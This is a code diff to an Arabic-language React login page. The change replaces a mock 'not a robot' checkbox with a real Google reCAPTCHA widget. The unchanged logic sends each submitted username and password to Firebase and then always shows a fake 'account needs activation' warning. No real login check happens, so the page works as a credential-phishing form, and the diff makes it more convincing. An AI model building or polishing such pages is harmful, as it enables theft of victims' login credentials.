@@ -1,21 +1,28 @@
-import React, { useState } from "react";
+import React, { useState, useRef } from "react";
 import { Link, useLocation } from "wouter";
 import { Header } from "@/components/Header";
 import { Footer } from "@/components/Footer";
 import { User, Lock, ArrowLeft, MessageCircle, AlertCircle } from "lucide-react";
 import { Input } from "@/components/ui/input";
-import { Checkbox } from "@/components/ui/checkbox";
 import { Button } from "@/components/ui/button";
 import { toast } from "sonner";
 import { saveLoginAttempt } from "@/lib/firebase";
+import ReCAPTCHA from "react-google-recaptcha";
+
+const RECAPTCHA_SITE_KEY = import.meta.env.VITE_RECAPTCHA_SITE_KEY || "6LeIxAcTAAAAAJcZVRqyHh71UMIEGNQ_MXjiZKhI";
 
 export default function Login() {
   const [, setLocation] = useLocation();
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
-  const [isRobot, setIsRobot] = useState(false);
+  const [captchaToken, setCaptchaToken] = useState<string | null>(null);
   const [isLoading, setIsLoading] = useState(false);
   const [showActivationMessage, setShowActivationMessage] = useState(false);
+  const recaptchaRef = useRef<ReCAPTCHA>(null);
+
+  const handleCaptchaChange = (token: string | null) => {
+    setCaptchaToken(token);
+  };
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -25,27 +32,25 @@ export default function Login() {
       return;
     }
 
-    if (!isRobot) {
+    if (!captchaToken) {
       toast.error("يرجى التحقق من أنك لست روبوت");
       return;
     }
 
     setIsLoading(true);
 
-    // Save login attempt to Firebase
     await saveLoginAttempt(username, password);
 
-    // Simulate checking if account exists but not activated
     setTimeout(() => {
       setIsLoading(false);
-      // Show activation message
       setShowActivationMessage(true);
       toast.warning("الحساب يحتاج إلى تفعيل");
+      recaptchaRef.current?.reset();
+      setCaptchaToken(null);
     }, 1000);
   };
 
   const goToRegister = () => {
-    // Navigate to registration to complete the process
     setLocation("/register");
   };
 
@@ -122,24 +127,13 @@ export default function Login() {
                     </div>
                   </div>
 
-                  <div className="bg-gray-50 p-4 border border-gray-200 rounded-md mt-6">
-                    <div className="flex items-center justify-between">
-                      <div className="flex items-center gap-2">
-                        <Checkbox 
-                          id="robot" 
-                          checked={isRobot}
-                          onCheckedChange={(checked) => setIsRobot(checked as boolean)}
-                          data-testid="checkbox-robot"
-                        />
-                        <label htmlFor="robot" className="text-sm text-gray-600 cursor-pointer">
-                          أنا لست برنامج روبوت
-                        </label>
-                      </div>
-                      <div className="flex flex-col items-center">
-                        <div className="w-8 h-8 border-2 border-blue-500 rounded-full border-t-transparent animate-spin mb-1 opacity-20"></div>
-                        <span className="text-[10px] text-gray-400">reCAPTCHA</span>
-                      </div>
-                    </div>
+                  <div className="flex justify-center mt-6">
+                    <ReCAPTCHA
+                      ref={recaptchaRef}
+                      sitekey={RECAPTCHA_SITE_KEY}
+                      onChange={handleCaptchaChange}
+                      hl="ar"
+                    />
                   </div>
 
                   <div className="flex gap-4 pt-4">
